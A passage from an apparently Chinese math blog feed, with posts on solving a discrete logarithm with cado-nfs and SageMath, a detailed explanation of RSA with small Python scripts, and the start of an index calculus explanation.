style="margin-right:0.03588em;">g</span></span></span><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.773108em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mord mathnormal">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.069108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">’</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">运</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">程</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">另</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">基</span></span></span></span></span></p>
<p>​	那么上一步首先计算的是 log_g'h</p>
<figure class="highlight dockerfile"><figcaption data-lang="Docker"></figcaption><table><tr><td data-num="1"></td><td><pre>./cado<span class="token punctuation">-</span>nfs.py <span class="token punctuation">-</span>dlp <span class="token punctuation">-</span>ell 454197539 target=473245325750516889002351266535 1000000000000000000000000000057</pre></td></tr></table></figure><p>​	得到结果</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/05/06/424213e2113c6f6b.png" alt="" /></p>
<p>​	这次就该算 log_g'g 了</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/05/06/c54af5c941beb685.png" alt="" /></p>
<p>​	跑出来结果是</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/05/06/10078dbe1c706844.png" alt="" /></p>
<p>​	还是蛮快滴，毕竟数不是很大，我们的 Cado 还是蛮争气的嘛</p>
<p>​	接下来用 sagemath 开始算 x</p>
<figure class="highlight matlab"><figcaption data-lang="MATLAB"></figcaption><table><tr><td data-num="1"></td><td><pre>p <span class="token operator">=</span> <span class="token number">1000000000000000000000000000057</span></pre></td></tr><tr><td data-num="2"></td><td><pre>R <span class="token operator">=</span> <span class="token function">GF</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>g <span class="token operator">=</span> <span class="token function">R</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>gx <span class="token operator">=</span> <span class="token function">R</span><span class="token punctuation">(</span><span class="token number">473245325750516889002351266535</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>ell <span class="token operator">=</span> <span class="token number">454197539</span></pre></td></tr><tr><td data-num="6"></td><td><pre>log_h <span class="token operator">=</span> <span class="token number">151131208</span></pre></td></tr><tr><td data-num="7"></td><td><pre>log_g <span class="token operator">=</span> <span class="token number">31054636</span></pre></td></tr><tr><td data-num="8"></td><td><pre>temp <span class="token operator">=</span> log_h <span class="token operator">*</span> <span class="token function">inverse_mod</span><span class="token punctuation">(</span>log_g<span class="token punctuation">,</span> ell<span class="token punctuation">)</span> <span class="token comment">% ell</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>g<span class="token operator">^</span>temp<span class="token punctuation">)</span> #校验模余</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>gx<span class="token punctuation">)</span> #模余</pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/05/06/ac2ac5ea38b1d891.png" alt="" /></p>
<p>校验一下模余确实匹配</p>
<p>不过两亿多的指数如果要硬分解的话，给你们看看我做的测试</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/05/06/af71c8bee72eda05.png" alt="" /></p>
<p>真的很长，这只是一小段；所以计算机真的方便了我们很多很多啊</p>
<h2 id="正题"><a class="anchor" href="#正题">#</a> 正题</h2>
<p>回归正题，为什么我的 P 和 Q_A 最后分解就报错呢？</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/05/06/76ea260f0159870e.png" alt="" /></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/05/06/4e8771413c7ee68d.webp" alt="" /></p>
<p>暂时还没解决，毕竟是挑战题。</p>
]]></content>
      <categories>
        <category>数论</category>
        <category>Math</category>
      </categories>
      <tags>
        <tag>DLP</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA加密算法详细解说</title>
    <url>/number/math/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%B4/</url>
    <content><![CDATA[<p>RSA 加密算法是一种非对称加密算法，加密由公钥，私钥，明文，密文四部分组成.<br />
<a id="more"></a></p>
<h2 id="取模运算"><a class="anchor" href="#取模运算">#</a> 取模运算</h2>
<p>a mod n ≡ b 表示 a 与 b 对模 n 同余 (a,b 分别除以 n)</p>
<div class="note info">
<p>举个栗子: 3 mod 2 ≡ 1 &lt;--&gt; 1mod2=1 且 3mod2=1</p>
</div>
<h2 id="欧拉函数"><a class="anchor" href="#欧拉函数">#</a> 欧拉函数</h2>
<p>任意给定正整数 n，计算在小于等于 n 的正整数之中，有多少个与 n 构成互质关系？计算这个值的方法就叫做欧拉函数，以 φ(n) 表示.</p>
<div class="note info">
<p>例如，在 1 到 8 之中，与 8 形成互质关系的是 1、3、5、7，所以 φ(n)=4</p>
</div>
<h3 id="在rsa算法中欧拉函数对以下定理成立"><a class="anchor" href="#在rsa算法中欧拉函数对以下定理成立">#</a> 在 RSA 算法中，欧拉函数对以下定理成立</h3>
<p>1. 如果 n 可以分解成两个互质的整数之积，即 n=p×q，则有：φ(n)=φ(pq)=φ( p )φ( q );<br />
2. 当 p 为质数，φ(p)=p-1</p>
<p>所以有 φ(n)=(p-1)(q-1)</p>
<h2 id="欧拉定理与模反元素"><a class="anchor" href="#欧拉定理与模反元素">#</a> 欧拉定理与模反元素</h2>
<p>欧拉函数的用处，在于欧拉定理<br />
 “欧拉定理” 指的是:<br />
 如果两个正整数 a 和 n 互质，则 n 的欧拉函数 φ(n) 可以让下面的等式成立：<br />
a^φ(n)≡1(modn)<br />
 也就是说，a 的 φ(n) 次方被 n 除的余数为 1</p>
<h3 id="模反元素的推导过程如下"><a class="anchor" href="#模反元素的推导过程如下">#</a> 模反元素的推导过程如下:</h3>
<p>根据欧拉定理，有：<br />
a^φ(n) = a × a^(φ(n)−1)≡1(modn)</p>
<p>令 b=a^(φ(n)−1)，得：</p>
<p>ab≡1(modn)</p>
<div class="note info">
<p>b 就是 a 的模反元素<br />
所以，如果两个正整数 a 和 n 互质，那么一定可以找到整数 b 使得 ab-1 被 n 整除，或者说 ab 被 n 除的余数是 1</p>
</div>
<p><span class="green">所以求私钥 d 的公式：d*e≡1mod [(p-1)(q-1)]</span></p>
<h3 id="如何求d"><a class="anchor" href="#如何求d">#</a> 如何求 d</h3>
<p>例如我们定义 e 为 17,p=473398607161，q=4511491<br />
 为了求出 d 我们写出如下脚本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 17x + 2135733082216268400y = 1</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">def</span> <span class="token function">ext_euclid</span> <span class="token punctuation">(</span> a <span class="token punctuation">,</span> b <span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a</pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        x <span class="token punctuation">,</span> y <span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span> b <span class="token punctuation">,</span> a <span class="token operator">%</span> b <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        x <span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">return</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>ext_euclid<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span>  <span class="token number">2135733082216268400</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>由于 d<em>e≡1mod [(p-1)(q-1) 可等价为 d</em>e mod (p-1)(q-1)=1<br />
 代入 e、p、q<br />
 所以我们可以把上式看作: 17x+(473398607161-1)(4511491-1) y=1</p>
<p>代入 φ(n) = (p-1)(q-1),φ(n) 与 e 互质，k 为正整数<br />
可化为：d= (k*φ(n)+1)/e</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>公钥    n -->  两素数p、q之积</pre></td></tr><tr><td data-num="2"></td><td><pre>        e -->  1&lt;e<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>(p-1)·(q-1)且e与乘积互质</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token attr-name">私钥</span>    <span class="token attr-name">d</span> <span class="token attr-name">--</span><span class="token punctuation">></span></span>  d·e ≡ 1 mod[(p-1)·(q-1)]</pre></td></tr><tr><td data-num="4"></td><td><pre>        n -->  同公钥n</pre></td></tr><tr><td data-num="5"></td><td><pre>加密    ----->  C ≡ M^e mod(n)   M为明文</pre></td></tr><tr><td data-num="6"></td><td><pre>解密    ----->  M ≡ C^d mod(n)   C为密文</pre></td></tr></table></figure><h2 id="由pqdpdqc求明文的算法"><a class="anchor" href="#由pqdpdqc求明文的算法">#</a> 由 p,q,dp,dq,c 求明文的算法</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre>I <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>q<span class="token punctuation">,</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>mp <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dp<span class="token punctuation">,</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>mq <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>q<span class="token punctuation">)</span>               <span class="token comment">#求幂取模运算</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mp<span class="token operator">-</span>mq<span class="token punctuation">)</span><span class="token operator">*</span>I<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">*</span>q<span class="token operator">+</span>mq       <span class="token comment">#求明文公式</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token comment">#转为十六进制</span></pre></td></tr></table></figure><p><mark>pow (a,b,c) 表示 a<sup>b</sup> % c 即 a<sup>b</sup> mod c</mark></p>
<h3 id="数学运算规律"><a class="anchor" href="#数学运算规律">#</a> 数学运算规律</h3>
<p>a<sup>b</sup> %p = ((a%p)<sup>b</sup>)%p<br />
 若 a≡b (% p), 则对任意的 c, 都有 (a+c)≡(b+c)(% p)<br />
 若 a≡b (% p), 则对任意的 c, 都有 (a<em>c)≡(b</em>c)(%p)<br />
 若 a≡b (% p), 对任意的 c, 都有 c≡d (% p), 那么 (a+c)≡(b+d)(% p),(a<em>c)≡(b</em>d)(%p)</p>
<p>运算推论：参考 <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pa2Vjb2tlL2FydGljbGUvZGV0YWlscy8xMDU5Njc4MDk/dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLWJhaWR1anNfdGl0bGUtMiZhbXA7c3BtPTEwMDEuMjEwMS4zMDAxLjQyNDI=">https://blog.csdn.net/mikecoke/article/details/105967809?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&amp;spm=1001.2101.3001.4242</span></p>
<p><img data-src="https://ftp.bmp.ovh/imgs/2021/02/6477b861b60b9672.png" alt="" /></p>
<p><img data-src="https://ftp.bmp.ovh/imgs/2021/02/2488b83b697b9b94.png" alt="" /></p>
]]></content>
      <categories>
        <category>数论</category>
        <category>Math</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>亚指数时间计算</title>
    <url>/number/math/%E4%BA%9A%E6%8C%87%E6%95%B0%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<p>椭圆曲线密码体制具有对带宽和存储空间的需求相对较小以及安全曲线选择丰富等优势，其安全性主要依赖于椭圆曲线离散对数问题的难解性。但如果相关密码系统的曲线参数和加密过程中的随机数发生器选择不当，都有可能使得该系统不安全。对一些特殊的椭圆曲线离散对数问题，存在多项式时间或者亚指数时间算法。但对任意给定椭圆曲线上的离散对数问题，在经典计算机模型下目前仍然没有<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0szNDZLMzQ2L2FydGljbGUvZGV0YWlscy81MTAyNjAwNg==">多项式时间算法</span>，值得深入探究。</p>
<p><a id="more"></a></p>
<p>有限域中的离散对数问题可用亚指数时间的指标演算法求解。 对于 ECDLP 常见的求解算法有大步 - 小步法、 Pollard’s rho 算法等。一般来说，当参数 p 较大时，这些算法并不容易求解。而在参数设定不当时，ECDLP 的困难性会下降； 如 MOV 攻击可以利用双线性对将 ECDLP 求解转为有限域中乘法群的 DLP 求解，而有限域的乘法群中 DLP 存在亚指数时间的算法。</p>
<p>指数积分算法是目前已知最有力的计算离散对数方法，这项技术并不能应用于所有群。</p>
<h2 id="指数积分算法"><a class="anchor" href="#指数积分算法">#</a> 指数积分算法</h2>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>输入：乘法群</mtext><msubsup><mi>Z</mi><mi>p</mi><mo>∗</mo></msubsup><mtext>的生成元</mtext><mi>α</mi><mtext>和</mtext><mi>β</mi></mrow><annotation encoding="application/x-tex">输入：乘法群Z_p^*的生成元 \alpha 和\beta
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.121804em;vertical-align:-0.383108em;"></span><span class="mord cjk_fallback">输</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">群</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.738696em;"><span style="top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">元</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord cjk_fallback">和</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>输出：离散对数</mtext><mi>x</mi><mo>=</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>α</mi></msub><mi>β</mi></mrow><annotation encoding="application/x-tex">输出：离散对数x=log_\alpha \beta
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">输</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">离</span><span class="mord cjk_fallback">散</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>指数积分算法需要选择一个相对较小在</mtext><msubsup><mi>Z</mi><mi>p</mi><mtext>∗</mtext></msubsup><mtext>中的元集合</mtext><mi>S</mi><mo>=</mo><mo stretchy="false">{</mo><msub><mi>p</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>p</mi><mn>2</mn></msub><mtext>，</mtext><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">}</mo><mtext>称之为分解基</mtext><mo stretchy="false">(</mo><mtext>都是素数</mtext><mo stretchy="false">)</mo><mtext>。这种方法中，</mtext><msubsup><mi>Z</mi><mi>p</mi><mtext>∗</mtext></msubsup><mtext>中大的元可以有效表示为集合</mtext><mi>S</mi><mtext>上元的乘积。</mtext></mrow><annotation encoding="application/x-tex">指数积分算法需要选择一个相对较小在Z_p^∗ 中的元集合S=\lbrace p_1,p_2，.....,p_i \rbrace称之为分解基(都是素数)。这种方法中，Z_p^∗ 中大的元可以有效表示为集合S上元的乘积。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.121804em;vertical-align:-0.383108em;"></span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">积</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">择</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">较</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">在</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.738696em;"><span style="top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">集</span><span class="mord cjk_fallback">合</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.133108em;vertical-align:-0.383108em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span><span class="mord cjk_fallback">称</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">基</span><span class="mopen">(</span><span class="mord cjk_fallback">都</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">数</span><span class="mclose">)</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">种</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.738696em;"><span style="top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">效</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">集</span><span class="mord cjk_fallback">合</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">积</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p>首先我们先选择一个分解基 S，然后收集关于 S 上对数元的线性关系</p>
<ol>
<li>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>选择一个随机整数</mtext><mi>k</mi><mtext>，</mtext><mn>0</mn><mo>≤</mo><mi>k</mi><mo>≤</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mtext>计算</mtext><msup><mi>α</mi><mi>k</mi></msup></mrow><annotation encoding="application/x-tex">选择一个随机整数k，0\leq k\leq n-1,计算\alpha ^k
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">择</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">随</span><span class="mord cjk_fallback">机</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">，</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span></span></p>
</li>
<li>
